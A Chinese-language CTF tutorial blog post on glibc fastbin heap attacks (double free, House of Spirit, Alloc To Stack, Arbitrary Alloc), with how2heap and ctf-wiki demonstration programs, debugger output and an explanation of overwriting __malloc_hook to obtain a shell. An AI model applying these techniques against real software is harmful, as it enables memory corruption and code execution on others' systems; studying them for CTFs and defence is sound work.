**最近打CTF，发现fastbin和smallbin是最容易被利用的，那么我们来学习一下Fastbin的攻击都有哪些类型**

# Double Free

首先我们已经有过了解，fastbin中的chunk在释放以后nextchunk的previnuse位不会被清0，这样我们就可以连续申请然后连续释放，但是chunk不会合并，还在fastbin中。其次就是fastbin中对double
free的检查并不完善，只会检查fastbin指向的第一个块

    
    
    #include <stdio.h>
    #include <stdlib.h>
    int main(){
    	int *p = malloc(0x20);
    	free(p);
    	free(p);
    }
    

我们先来看一下这个简短的代码，编译运行![image.png](https://image.3001.net/images/20211012/1634030818_616554e2ae25751dd15ba.png!small)可以看到，glibc已经检测出我们进行了double
free，但是我们改一下代码看看有什么效果

    
    
    #include <stdio.h>
    #include <stdlib.h>
    int main(){
    	int *p1 = malloc(0x20);
    	int *p2 = malloc(0x20);
    	free(p1);
    	free(p2);
    	free(p1);
    }
    

然后看一下执行情况![image.png](https://image.3001.net/images/20211012/1634030998_61655596f0ef2f3dc4c25.png!small)由于没有任何输出，所以没有任何回显，但是没有报错，说明double
free利用成功。我们再调试一波代码![image.png](https://image.3001.net/images/20211012/1634031107_616556039c83ecb97c0c7.png!small)那么我们画一下图，看看发生了什么![image.png](https://image.3001.net/images/20211012/1634031367_616557079231898da2444.png!small)这就是三次free发生的情况，所以说检测double
free只检测和fastbin指向的第一个chunk。![image.png](https://image.3001.net/images/20211012/1634031686_616558467e4bc1834e42a.png!small)

然后我们来看一下实战中的利用，我在ctfwiki找的代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    typedef struct _chunk
    {
        long long pre_size;
        long long size;
        long long fd;
        long long bk;
    } CHUNK,*PCHUNK;
    
    CHUNK bss_chunk;
    
    int main(void)
    {
        void *chunk1,*chunk2,*chunk3;
        void *chunk_a,*chunk_b;
    
        bss_chunk.size=0x21;
        chunk1=malloc(0x10);
        chunk2=malloc(0x10);
    
        free(chunk1);
        free(chunk2);
        free(chunk1);
    
        chunk_a=malloc(0x10);
        *(long long *)chunk_a=&bss_chunk;
        malloc(0x10);
        malloc(0x10);
        chunk_b=malloc(0x10);
        printf("%p",chunk_b);
        return 0;
    }
    

然后我们编译以后，运行一下。首先定义了一个结构体并且创建了一个全局变量，放在bss段中。然后利用double
free得到全局变量的地址。![image.png](https://image.3001.net/images/20211012/1634044821_61658b9519c05fd3e1e7d.png!small)此时我们可以发现我们已经申请到了bss段的内存。  
我们来解析一下这个函数发生了什么：  
首先，在我们利用double
free这个漏洞的时候，此时的内存![image.png](https://image.3001.net/images/20211012/1634044974_61658c2ea917226e15b0d.png!small)这意味着什么呢？这意味着我们的bin中虽然有两个chunk，但是我们可以无限malloc。因为两个chunk之间的指针已经开始了循环。然后我们申请的chunk_a本质上就是chunk1，然后我们往chunk1中写入内容，其实就是往chunk1的fd指针写入全局变量的fd指针，此时的内存情况应该是这样![image.png](https://image.3001.net/images/20211012/1634045287_61658d670376e95aef4e6.png!small)因此还需要再次malloc两个chunk，最后申请bss_chunk。当然，我们一开始就对全局变量的size域进行了赋值，否则int_malloc就会进行检查

    
    
    if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
        {
          errstr = "malloc(): memory corruption (fast)";
        errout:
          malloc_printerr (check_action, errstr, chunk2mem (victim));
          return NULL;
    }
    

由此可知，对于double free，我们在成功通过验证的情况下可以任意地址写，通过这个来篡改一些堆块的数据

# House Of Spirit

这个利用就是通过释放我们伪造的chunk然后再进行获取，但是限制比较多

  1. fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
  2. fake chunk 地址需要对齐MALLOC_ALIGN_MASK，fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
  3. fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem (主存储域默认为128kb)。
  4. fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

然后我们直接看how2heap的代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
        fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
    
        fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
        malloc(1);
    
        fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
        unsigned long long *a;
        // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
    
        fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
    
        fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
        fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
        fake_chunks[1] = 0x40; // this is the size
    
        fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
            // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
        fake_chunks[9] = 0x1234; // nextsize
    
        fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
        fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
        a = &fake_chunks[2];
    
        fprintf(stderr, "Freeing the overwritten pointer.\n");
        free(a);
    
        fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
        fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
    }
    

然后我们直接看输出

    
    
    This file demonstrates the house of spirit attack.
    Calling malloc() once so that it sets up its memory.
    We will now overwrite a pointer to point to a fake 'fastbin' region.
    This region must contain two chunks. The first starts at 0x7ffd2da63628 and the second at 0x7ffd2da63658.
    This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
    ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
    The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av->system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .
    Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd2da63628.
    ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
    Freeing the overwritten pointer.
    Now the next malloc will return the region of our fake chunk at 0x7ffd2da63628, which will be 0x7ffd2da63630!
    malloc(0x30): 0x7ffd2da63630
    

输出结果不重要，重要的是这个代码的执行。最开始申请了1字节内存为了开辟heap区域，然后伪造了fake
chunk，并且以16字节对齐(本质上是伪造了两个chunk)  
然后对fake chunk的下标为1的内存赋值，这就是fake
chunk的size域。然后我们创建了一个指针并且将指针放在下标为2的区域，这就是user域。然后进行释放，我们伪造的内存就成功的进入bin中。

# Alloc To Stack

造成这个漏洞的原因是因为malloc过于相信chunk的fd指针，只有很少的检查。利用这一点我们可以考虑劫持chunk的fd指针指向栈区，然后进行利用。直接上代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    typedef struct _chunk
    {
        long long pre_size;
        long long size;
        long long fd;
        long long bk;
    } CHUNK,*PCHUNK;
    
    int main(void)
    {
        CHUNK stack_chunk;
    
        void *chunk1;
        void *chunk_a;
    
        stack_chunk.size=0x21;
        chunk1=malloc(0x10);
    
        free(chunk1);
    
        *(long long *)chunk1=&stack_chunk;
        malloc(0x10);
        chunk_a=malloc(0x10);
        return 0;
    }
    

我们先来看一下代码。首先创建了一个chunk结构体，并且在main函数中创建了对象。

然后创建两个指针，并且给结构体的size域进行赋值。然后使用chunk1申请内存，释放chunk1以后由于没有将指针置空，所以存在UAF的漏洞。

然后给*chunk1赋值本质上就是将chunk1的fd指针赋值，将stack_chunk的地址赋给fd指针，然后再次申请以后就获取到了栈中的地址。

我们先来画图看一下![image.png](https://image.3001.net/images/20211013/1634100702_616665deda7b812b220d9.png!small)  
中间的这个无指针的malloc就是为了把chunk1先拿出去，然后再次malloc就能得到stack_chunk

然后我们来一波调试，首先来看一下free掉chunk1以后chunk的状态

    
    
    Free chunk (fastbins) | PREV_INUSE
    Addr: 0x602000
    Size: 0x21
    fd: 0x7fffffffddd0
    

此时chunk的fd指针已经被修改到stack_chunk上

    
    
    fastbins
    0x20: 0x602000 —▸ 0x7fffffffddd0 —▸ 0x400620 (__libc_csu_init) ◂— 0x7de2d8d48550020 /* ' ' */
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    

**可以发现本质上和House Of Spirit其实一样，只不过Alloc To Stack是利用一个真实的chunk将其fd指针覆盖以后指向stack
chunk，另外一个是直接构造假的chunk然后进行free。**

# Arbitrary Alloc

Alloc To
Stack是将stack作为chunk，而该漏洞更加一般，不仅仅用在栈上，包括bss段、data段等等。我们在漏洞利用的时候最常用的就是Hook劫持。这就是将Hook作为chunk，然后进行写入。

**hook的相关知识我将会专门写一篇文章来论述，但是我们先知道，我们最常用的就是malloc_hook、free_hook、realloc_hook。一般情况下这些hook都为0，但是当我们将这些hook的值篡改为某些函数的地址的时候，调用相关函数时会先调用之前说的某些函数。举个例子就是当我们将malloc_hook地址修改为system("/bin/sh")的话，我们调用malloc就是在调用system函数，于是我们就拿到了shell**

下面是我在CTFwiki上面找的作者得案例，然后我会进行一些讲解

    
    
    int main(void)
    {
    
    
        void *chunk1;
        void *chunk_a;
    
        chunk1=malloc(0x60);
    
        free(chunk1);
    
        *(long long *)chunk1=0x7ffff7dd1af5-0x8;
        malloc(0x60);
        chunk_a=malloc(0x60);
        return 0;
    }
    

首先申请了一个chunk，大小为0x60，然后free掉chunk1，但是依旧有UAF漏洞，然后更改chunk1的fd指针。然后进行两次chunk最后对malloc_hook进行写入。  
然后我们看一下作者构造chunk1，作者说是在他的本机上找的，然后利用字节错位。其实就是要放入大小合适的chunk，最开始申请了0x60字节的chunk，那么最终大小就是0x70，那么我们寻找的fake
chunk的size域也应该拥有0x70字节的大小，并且可以包含malloc_hook

    
    
    0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
    0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
    0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
    0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
    0x7ffff7dd1b10 <__malloc_hook>: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
    

然后我们应该寻找size字段，size字段的大小应该是0x70。很明显，在0x7ffff7dd1af5处的数值：0x7f。明明不是0x70，为什么选这个？我们首先要知道，大小为0x70的chunk在fastbin中处于idx=5的地方

    
    
    #define fastbin_index(sz)                                               
        ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
    

要注意算数右移会把后四位全部清0，所以0x7f在这里也是在idx=5的地方(大家还是不懂的话可以使用计算器计算一下，就知道了)。而且还能包含malloc_hook。申请到空间以后就可以对malloc进行写(不要忘记什么是小端法)

**这些基本就是常见的fastbin的漏洞，漏洞的相关内容也是看的CTFwiki上面，最开始有一些操作我也感觉很迷，但是慢慢的就悟了，漏洞利用不一定难，大部分难在代码审计(头秃)**

 **本文参考自[Fastbin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#arbitrary-alloc)**

